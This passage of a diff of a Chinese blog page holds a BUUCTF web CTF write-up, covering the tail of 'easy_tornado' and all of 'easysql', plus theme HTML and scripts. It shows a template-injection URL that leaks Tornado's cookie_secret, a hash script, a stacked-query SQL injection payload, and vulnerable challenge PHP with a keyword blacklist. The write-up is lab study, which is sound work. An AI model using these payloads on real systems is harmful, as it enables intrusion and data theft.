=&quot;&quot;</span><br><span class="line">    print(md5value(filename.encode(&apos;utf-8&apos;)))</span><br><span class="line">    x=md5value(filename.encode(&apos;utf-8&apos;))</span><br><span class="line">    y=cookie_s+x</span><br><span class="line">    print(md5value(y.encode(&apos;utf-8&apos;)))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">jiami()</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs #python">#!-*-coding:utf-8 -*-
+import hashlib
+ 
+def md5value(s):
+    md5 = hashlib.md5() 
+    md5.update(s) 
+    return md5.hexdigest()
+ 
+def jiami(): 
+    filename = &apos;/fllllllllllllag&apos;
+    cookie_s =&quot;&quot;
+    print(md5value(filename.encode(&apos;utf-8&apos;)))
+    x=md5value(filename.encode(&apos;utf-8&apos;))
+    y=cookie_s+x
+    print(md5value(y.encode(&apos;utf-8&apos;)))
+ 
+ 
+jiami()</code></pre>
 <p>要计算filehash我们还缺少cookie，这时注意到了welcome.txt中的提示render，原来我们报错页面的回显是可控的，在msg中传入表达式会被执行，所以想到了模板注入，去搜了搜<br>torando框架，发现了其中的handler类，它代表着业务逻辑，我们进行服务端开发时就是编写一堆一堆的handler用来服务客户端请求。<br>参考的大佬博客：<a href="https://xz.aliyun.com/t/2908" target="_blank" rel="noopener">https://xz.aliyun.com/t/2908</a><br>通过handler.application即可访问整个Tornado。</p>
 <p>简单而言通过或者就可获得settings中的cookie_secret。<br>所以有了如下payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://187e4e0a-2fe3-4a4e-a684-c4b532ad0102.node3.buuoj.cn/error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7164.JPG" alt="picture"><br>获取cookie——secret的值，带入脚本计算得到filehash的值<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7165.JPG" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7166.JPG" alt="picture"></p>
+<pre><code class="hljs aspectj">http://187e4e0a-2fe3-4a4e-a684-c4b532ad0102.node3.buuoj.cn/<span class="hljs-keyword">error</span>?msg=&#123;&#123;<span class="hljs-keyword">handler</span>.settings&#125;&#125;</code></pre>
+<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7164.JPG" srcset="/img/loading.gif" alt="picture"><br>获取cookie——secret的值，带入脚本计算得到filehash的值<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7165.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7166.JPG" srcset="/img/loading.gif" alt="picture"></p>
 <!-- toc -->
 <h3 id="0x04-easysql"><a href="#0x04-easysql" class="headerlink" title="0x04  easysql"></a>0x04  easysql</h3><p>这题试了半天，发现过滤了一堆东西，所以只能找一找wp，来分析一下别人的payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;set sql_mode=PIPES_AS_CONCAT;select 1</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs routeros">1;<span class="hljs-builtin-name">set</span> <span class="hljs-attribute">sql_mode</span>=PIPES_AS_CONCAT;select 1</code></pre>
 <p>还有这道题的源码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    include_once &quot;config.php&quot;;</span><br><span class="line"></span><br><span class="line">    $post = array();</span><br><span class="line">    $get = array();</span><br><span class="line">    global $MysqlLink;</span><br><span class="line"></span><br><span class="line">    //GetPara();</span><br><span class="line">    $MysqlLink = mysqli_connect(&quot;localhost&quot;,$datauser,$datapass);</span><br><span class="line">    if(!$MysqlLink)&#123;</span><br><span class="line">        die(&quot;Mysql Connect Error!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $selectDB = mysqli_select_db($MysqlLink,$dataName);</span><br><span class="line">    if(!$selectDB)&#123;</span><br><span class="line">        die(&quot;Choose Database Error!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    foreach ($_POST as $k=&gt;$v)&#123;</span><br><span class="line">        if(!empty($v)&amp;&amp;is_string($v))&#123;</span><br><span class="line">            $post[$k] = trim(addslashes($v));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    foreach ($_GET as $k=&gt;$v)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //die();</span><br><span class="line">    ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;/ a&gt;</span><br><span class="line">&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;query&quot;&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    if(isset($post[&apos;query&apos;]))&#123;</span><br><span class="line">        $BlackList = &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\&quot;&quot;;</span><br><span class="line">        //var_dump(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&apos;query&apos;]));</span><br><span class="line">        if(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&apos;query&apos;]))&#123;</span><br><span class="line">            //echo $post[&apos;query&apos;];</span><br><span class="line">            die(&quot;Nonono.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if(strlen($post[&apos;query&apos;])&gt;40)&#123;</span><br><span class="line">            die(&quot;Too long.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $sql = &quot;select &quot;.$post[&apos;query&apos;].&quot;||flag from Flag&quot;;</span><br><span class="line">        mysqli_multi_query($MysqlLink,$sql);</span><br><span class="line">        do&#123;</span><br><span class="line">            if($res = mysqli_store_result($MysqlLink))&#123;</span><br><span class="line">                while($row = mysqli_fetch_row($res))&#123;</span><br><span class="line">                    print_r($row);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;while(@mysqli_next_result($MysqlLink));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs #php">&lt;?php
+    session_start();
+
+    include_once &quot;config.php&quot;;
+
+    $post = array();
+    $get = array();
+    global $MysqlLink;
+
+    //GetPara();
+    $MysqlLink = mysqli_connect(&quot;localhost&quot;,$datauser,$datapass);
+    if(!$MysqlLink)&#123;
+        die(&quot;Mysql Connect Error!&quot;);
+    &#125;
+    $selectDB = mysqli_select_db($MysqlLink,$dataName);
+    if(!$selectDB)&#123;
+        die(&quot;Choose Database Error!&quot;);
+    &#125;
+
+    foreach ($_POST as $k=&gt;$v)&#123;
+        if(!empty($v)&amp;&amp;is_string($v))&#123;
+            $post[$k] = trim(addslashes($v));
+        &#125;
+    &#125;
+    foreach ($_GET as $k=&gt;$v)&#123;
+        &#125;
+    &#125;
+    //die();
+    ?&gt;
+
+&lt;html&gt;
+&lt;head&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+
+&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;/ a&gt;
+&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;
+&lt;input type=&quot;text&quot; name=&quot;query&quot;&gt;
+&lt;input type=&quot;submit&quot;&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+&lt;?php
+
+    if(isset($post[&apos;query&apos;]))&#123;
+        $BlackList = &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\&quot;&quot;;
+        //var_dump(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&apos;query&apos;]));
+        if(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&apos;query&apos;]))&#123;
+            //echo $post[&apos;query&apos;];
+            die(&quot;Nonono.&quot;);
+        &#125;
+        if(strlen($post[&apos;query&apos;])&gt;40)&#123;
+            die(&quot;Too long.&quot;);
+        &#125;
+        $sql = &quot;select &quot;.$post[&apos;query&apos;].&quot;||flag from Flag&quot;;
+        mysqli_multi_query($MysqlLink,$sql);
+        do&#123;
+            if($res = mysqli_store_result($MysqlLink))&#123;
+                while($row = mysqli_fetch_row($res))&#123;
+                    print_r($row);
+                &#125;
+            &#125;
+        &#125;while(@mysqli_next_result($MysqlLink));
+
+    &#125;
+
+    ?&gt;</code></pre>
 <p>这里系统变量@@sql_modesql_mode：是一组mysql支持的基本语法及校验规则<br>PIPES_AS_CONCAT：将“||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似<br>又注意到</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;select &quot;.$post[&apos;query&apos;].&quot;||flag from Flag&quot;;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs arcade"><span class="hljs-symbol">$s</span>ql = <span class="hljs-string">"select "</span>.<span class="hljs-symbol">$post</span>[<span class="hljs-string">'query'</span>].<span class="hljs-string">"||flag from Flag"</span>;</code></pre>
 <p>所以当我们将sql_modesql_mode设为PIPES_AS_CONCAT之后，查询语句中的||就变成看拼接字符串的作用，查询语句也变为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;select 1;set sql_mode=pipes_as_concat;select 1||flag from Flag&quot;;</span><br></pre></td></tr></table></figure>
-<p>这样就能查询到flag了<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7167.JPG" alt="picture"></p>
+<pre><code class="hljs sql">$sql = "<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>;<span class="hljs-keyword">set</span> sql_mode=pipes_as_concat;<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>||flag <span class="hljs-keyword">from</span> Flag<span class="hljs-string">";</span></code></pre>
+<p>这样就能查询到flag了<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7167.JPG" srcset="/img/loading.gif" alt="picture"></p>
 
-    </div>
-
-    
-    
-    
-
-      <footer class="post-footer">
-
-        
-
-          <div class="post-nav">
-            <div class="post-nav-next post-nav-item">
-                <a href="/2019/12/11/up-load%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/" rel="next" title="upload-labs通关笔记">
-                  <i class="fa fa-chevron-left"></i> upload-labs通关笔记
-                </a>
+            </article>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E9%A2%98%E8%A7%A3/">题解</a>
+                    
+                  </div>
+                
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/03/19/buuoj%E5%88%B7%E9%A2%98/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">buuoj刷题</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-6">
+                    
+                    
+                      <a href="/2019/12/11/up-load%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/">
+                        <span class="hidden-mobile">upload-labs通关笔记</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
             </div>
 
-            <span class="post-nav-divider"></span>
-
-            <div class="post-nav-prev post-nav-item">
-                <a href="/2020/03/19/buuoj%E5%88%B7%E9%A2%98/" rel="prev" title="buuoj刷题">
-                  buuoj刷题 <i class="fa fa-chevron-right"></i>
-                </a>
-            </div>
+            
           </div>
-      </footer>
-    
-  </article>
-  
-  
-  
-
-  </div>
-
-
-          </div>
-          
-
         </div>
-          
-  
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
   </div>
-
-  <aside class="sidebar">
-    <div class="sidebar-inner">
-
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          文章目录
-        </li>
-        <li class="sidebar-nav-overview">
-          站点概览
-        </li>
-      </ul>
-
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Warm-Up"><span class="nav-number">1.</span> <span class="nav-text">0x01 Warm Up</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-随便注"><span class="nav-number">2.</span> <span class="nav-text">0x02 随便注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-easy-tornado"><span class="nav-number">3.</span> <span class="nav-text">0x03  easy_tornado</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-easysql"><span class="nav-number">4.</span> <span class="nav-text">0x04  easysql</span></a></li></ol></div>
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <img class="site-author-image" itemprop="image" alt="Gee"
-    src="/uploads/1.jpg">
-  <p class="site-author-name" itemprop="name">Gee</p>
-  <div class="site-description" itemprop="description"></div>
 </div>
-<div class="site-state-wrap motion-element">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-          <a href="/archives/">
-        
-          <span class="site-state-item-count">12</span>
-          <span class="site-state-item-name">日志</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-            <a href="/categories/">
-          
-        <span class="site-state-item-count">6</span>
-        <span class="site-state-item-name">分类</span></a>
-      </div>
-  </nav>
-</div>
-  <div class="feed-link motion-element">
-    <a href="/atom.xml" rel="alternate">
-      <i class="fa fa-rss"></i>RSS
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
     </a>
-  </div>
-
-
-
-      </div>
-
-    </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
-
-
-      </div>
-    </main>
-
-    <footer class="footer">
-      <div class="footer-inner">
-        
-
-<div class="copyright">
   
-  &copy; 
-  <span itemprop="copyrightYear">2020</span>
-  <span class="with-love">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">Gee</span>
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
 </div>
-  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v4.0.0
-  </div>
-  <span class="post-meta-divider">|</span>
-  <div class="theme-info">主题 – <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.5.0
-  </div>
-<div class="busuanzi-count">
-  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-    <span class="site-uv">
-      <i class="fa fa-user"></i>
-      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
-    </span>
   
-    <span class="site-pv">
-      <i class="fa fa-eye"></i>
-      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
-    </span>
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
     </div>
-        
+    
 
+    
 
-
-
-
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
+    
   </div>
+</footer>
 
-  
-  <script src="/lib/anime.min.js"></script>
-  <script src="/lib/velocity/velocity.min.js"></script>
-  <script src="/lib/velocity/velocity.ui.min.js"></script>
-<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
-<script src="/js/schemes/pisces.js"></script>
-<script src="/js/next-boot.js"></script>
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
 
-
-
-  
-
-
-
-
-  <script src="/js/local-search.js"></script>
-
-
-
-
-
-
-
-
-
-
-
+<!-- Plugins -->
 
 
   
-
+    <script  src="/js/lazyload.js" ></script>
   
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: 'article.markdown-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "BUUCTF Web WriteUP&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 </body>
 </html>
